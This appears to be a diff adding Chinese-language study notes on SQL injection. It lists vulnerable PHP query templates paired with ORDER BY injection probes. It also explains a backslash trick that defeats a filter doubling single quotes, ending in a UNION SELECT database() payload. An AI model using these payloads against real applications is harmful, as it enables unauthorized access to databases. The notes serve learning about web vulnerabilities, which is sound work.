@@ -1,0 +1,46 @@
+数字型
+$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
+
+1) orer by 1-- -
+
+$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+
+1 order by 1#
+
+字符型
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+
+1' order by 1#
+
+$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
+
+1') order by 1#
+
+$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
+
+1')) order by 1#
+
+-------------------------------------------------------------------------
+查找（第三个参数）字符串中包含的（第一个参数）单引号，
+然后替换成（第二个参数）两个引号
+str_replace('\'', '\'\'', $_REQUEST['inject_string'])
+第一个参数：要查找的字符
+第二个参数：要替换的字符
+第三个参数：要查找替换的字符串
+SELECT username FROM users WHERE username = '$id'
+处理传入的单引号
+str_replace('\'', '\'\'', $_REQUEST['inject_string'])
+当我们尝试使用单引号闭合语句时，会被后端替换成2个单引号
+SELECT username FROM users WHERE username = '$id''
+绕过方法：使用反斜杠转义第一个单引号
+输入 \'时，后端会把单引号替换成两个单引号，但是我们加了一个转义符反斜杠，
+转义掉了第一个单引号，剩下的一个单引号成功闭合了语句。
+Herp Derper\''union select database()-- -' 
+最终传入数据库的语句就变成了
+SELECT username FROM users WHERE username = 'Herp Derper'union select database()-- -' 
+-------------------------------------------------------------------------
+
+
+
+因为在sql的字符串中 两个'才能表示一个'，而一个'表示字符串结束，所以才会引发问题
+
